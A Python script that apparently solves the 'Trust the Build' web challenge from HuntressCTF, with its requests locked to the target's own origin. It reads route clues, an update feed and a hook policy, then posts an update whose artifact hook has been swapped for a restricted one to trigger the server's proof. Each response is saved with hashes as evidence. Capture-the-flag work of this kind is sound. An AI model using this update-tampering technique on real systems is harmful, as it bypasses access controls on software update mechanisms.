#!/usr/bin/env python3
"""Activate a tampered update artifact on an assigned Trust the Build target."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"


def request(
    url: str,
    allowed_origin: tuple[str, str, int],
    *,
    payload: bytes | None = None,
) -> tuple[int, bytes]:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin route: {url}")
    headers = {"User-Agent": USER_AGENT, "Accept": "application/json"}
    if payload is not None:
        headers["Content-Type"] = "application/json"
    req = Request(
        normalized,
        data=payload,
        headers=headers,
        method="POST" if payload is not None else "GET",
    )
    try:
        with urlopen(req, timeout=15) as response:
            return response.status, response.read(MAX_BODY_BYTES + 1)
    except HTTPError as exc:
        return exc.code, exc.read(MAX_BODY_BYTES + 1)
    except URLError as exc:
        raise RuntimeError(f"request failed for {url}: {exc.reason}") from exc


def json_object(body: bytes, description: str) -> dict:
    value = json.loads(body.decode("utf-8"))
    if not isinstance(value, dict):
        raise ValueError(f"{description} was not a JSON object")
    return value


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="exact target URL returned by the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        hostname = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-trust-the-build-{timestamp}"
        )
        output_dir.mkdir(parents=True, exist_ok=True)

        clues_status, clues_body = request(
            urljoin(target, "/api/clues"), allowed_origin
        )
        if clues_status != 200:
            raise RuntimeError(f"route clues returned HTTP {clues_status}")
        clues = json_object(clues_body, "route clues")
        routes = {
            "feature_route": clues.get("feature_route"),
            "update_feed": clues.get("update_feed"),
            "update_policy": clues.get("update_policy"),
        }
        if not all(isinstance(value, str) and value for value in routes.values()):
            raise ValueError("route clues lack the update feature, feed, or policy route")

        feed_status, feed_body = request(urljoin(target, routes["update_feed"]), allowed_origin)
        policy_status, policy_body = request(
            urljoin(target, routes["update_policy"]), allowed_origin
        )
        if feed_status != 200 or policy_status != 200:
            raise RuntimeError(f"update feed/policy returned HTTP {feed_status}/{policy_status}")
        feed = json_object(feed_body, "update feed")
        policy = json_object(policy_body, "update policy")
        updates = feed.get("updates")
        hooks = policy.get("hooks")
        if not isinstance(updates, list) or not updates or not isinstance(hooks, list):
            raise ValueError("update feed or policy has an unexpected shape")
        restricted = [
            hook.get("name")
            for hook in hooks
            if isinstance(hook, dict) and hook.get("access") == "restricted"
        ]
        update = next(
            (
                item for item in updates
                if isinstance(item, dict) and isinstance(item.get("artifact"), dict)
            ),
            None,
        )
        if update is None or not restricted:
            raise ValueError("no artifact update or restricted hook was disclosed")

        tampered_update = json.loads(json.dumps(update))
        tampered_update["artifact"]["hook"] = restricted[0]
        feature_url = urljoin(target, routes["feature_route"])
        status, response_body = request(
            feature_url,
            allowed_origin,
            payload=json.dumps(tampered_update, separators=(",", ":")).encode(),
        )
        if len(response_body) > MAX_BODY_BYTES:
            raise RuntimeError("feature response exceeded the 2 MiB response limit")
        response = json_object(response_body, "feature response")
        proof = response.get("evidence")

        evidence = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "routes": routes,
            "selected_package": update.get("package"),
            "restricted_hook": restricted[0],
            "feature_status": status,
            "responses": {},
            "proof": proof if isinstance(proof, str) else None,
        }
        for name, body in (
            ("clues", clues_body),
            ("feed", feed_body),
            ("policy", policy_body),
            ("feature", response_body),
        ):
            filename = f"{name}.body"
            (output_dir / filename).write_bytes(body)
            evidence["responses"][name] = {
                "file": filename,
                "bytes": len(body),
                "sha256": hashlib.sha256(body).hexdigest(),
            }
        report_path = output_dir / "report.json"
        report_path.write_text(
            json.dumps(evidence, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        print(json.dumps({"proof": evidence["proof"], "report": str(report_path)}, indent=2))
        return 0 if evidence["proof"] else 1
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
